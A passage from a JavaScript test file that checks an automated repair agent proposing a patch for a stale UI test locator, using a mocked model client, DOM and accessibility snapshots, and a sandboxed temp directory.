                    evidenceObserved: '<h1>Products Catalog</h1>'
                })
            };

            const patchFilePath = path.resolve(TEMP_TEST_DIR, "grounded-repair.patch");
            const summaryFilePath = path.resolve(TEMP_TEST_DIR, "grounded-summary.json");

            const result = await runRepairAgent({
                contextPath: validLocatorPath,
                repairDir: TEMP_TEST_DIR,
                patchPath: patchFilePath,
                summaryPath: summaryFilePath,
                modelClient: groundedMock,
                domSnapshot: '<header><h1>Products Catalog</h1></header>',
                accessibilitySnapshot: 'heading "Products Catalog" [level=1]'
            });

            assert.strictEqual(result.status, "PROPOSED");
            assert.strictEqual(result.rootCause, "STALE_LOCATOR");
            assert.strictEqual(result.healedLocator, 'page.getByRole("heading", { level: 1, name: "Products Catalog" })');
            assert.strictEqual(fs.existsSync(patchFilePath), true);
        });

        console.log(`\n============================================================`);
        console.log(`All Phase 1, 2 & 3 Unit Tests Passed! (${passedTests}/${totalTests} tests passed)`);
        console.log(`============================================================\n`);
    } finally {
        teardownSandbox();
    }
}

runAll().catch((err) => {
    console.error("\n[TEST RUNNER FAILED]:", err);
    process.exit(1);
});
